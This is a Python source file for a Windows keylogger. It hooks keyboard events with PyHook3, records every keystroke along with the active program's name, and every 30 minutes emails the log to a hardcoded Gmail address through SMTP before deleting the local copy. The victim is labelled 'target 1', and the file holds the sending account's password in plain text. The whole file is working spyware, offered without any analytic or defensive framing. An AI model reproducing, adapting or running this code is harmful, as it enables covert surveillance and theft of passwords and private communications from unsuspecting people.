import pythoncom, PyHook3, os
from datetime import datetime
from email.mime.text import MIMEText
import smtplib
import threading

KEYDOWN = 'key down'
KEYUP = 'key up'
TO_EMAIL = 'namhoang4681@gmail.com'
PS_EMAIL = 't16121992'
PERIOD = 1800.0 #seconds
TARGET_NAME = 'target 1'
SVR_MAIL = 'smtp.gmail.com:587'

curr_date = datetime.now().strftime("%Y-%b-%d")
curr_path = os.path.dirname(os.path.realpath(__file__))
log_path = curr_path + '\\keylog-' + curr_date + '.txt'
curr_window = ''
special_key = [None] * 3
special_key[2] = 0

def OnKeyboardEvent(event):
    global curr_window
    log_file = open(log_path, 'a')
    if curr_window != event.WindowName:
        try:
            curr_window = event.WindowName
            log_file.write('\n\n================================================\n')
            log_file.write('Program: ' + curr_window)
            log_file.write('\nTime: ' + datetime.now().strftime("%Y-%b-%d %H:%M") + '\n')

            print('================================================')
            print('Program: ' + curr_window)
            print('Time: ' + datetime.now().strftime("%Y-%b-%d %H:%M"))

        except Exception as e:
            err_msg = 'ERROR Type: {0}. Args: {1!r}'.format(type(e).__name__, e.args)
            err_msg = str(err_msg.encode('ascii', 'replace'))[2:-1]

            print(err_msg)
            log_file.write('\n' + err_msg + '\n')

    if event.MessageName == KEYDOWN:
        if event.Ascii < 32 or event.Ascii > 126:
            if special_key[0] != event.Key or special_key[1] != 'down':
                special_key[0] = event.Key
                special_key[1] = 'down'
                print(' ['+ event.Key +' down]')
                log_file.write(' ['+ event.Key +' down] ')
            if event.Ascii == 8 or event.Key == 'Delete':
                special_key[2] = special_key[2] + 1
        else:
            print(chr(event.Ascii))
            log_file.write(chr(event.Ascii))

    if event.MessageName == KEYUP:
        if event.Ascii < 32 or event.Ascii > 126:
            if event.Ascii == 8 or event.Key == 'Delete':
                print(' x ' + str(special_key[2]))
                log_file.write('x ' + str(special_key[2]))
                special_key[2] = 0

            special_key[0] = event.Key
            special_key[1] = 'up'
            print(' ['+ event.Key +' up]')
            log_file.write(' ['+ event.Key +' up] ')

    log_file.close()
    return True

def send_email():
    log_file = open(log_path, 'r')
    msg = MIMEText(log_file.read())
    log_file.close()

    msg['Subject'] = TARGET_NAME + ' and ' + os.path.basename(log_path)
    msg['From'] = 'Target1'
    msg['To'] = TO_EMAIL
    mail_svr = smtplib.SMTP(SVR_MAIL)
    mail_svr.starttls()
    mail_svr.login(TO_EMAIL, PS_EMAIL)
    mail_svr.sendmail(TARGET_NAME, TO_EMAIL, msg.as_string())
    mail_svr.quit()

def send_email_period():
    threading.Timer(PERIOD, send_email_period).start()
    if os.path.isfile(log_path):
        send_email()
        os.remove(log_path)

send_email_period()
hm = PyHook3.HookManager()
hm.KeyDown = OnKeyboardEvent
hm.KeyUp = OnKeyboardEvent
hm.HookKeyboard()
pythoncom.PumpMessages()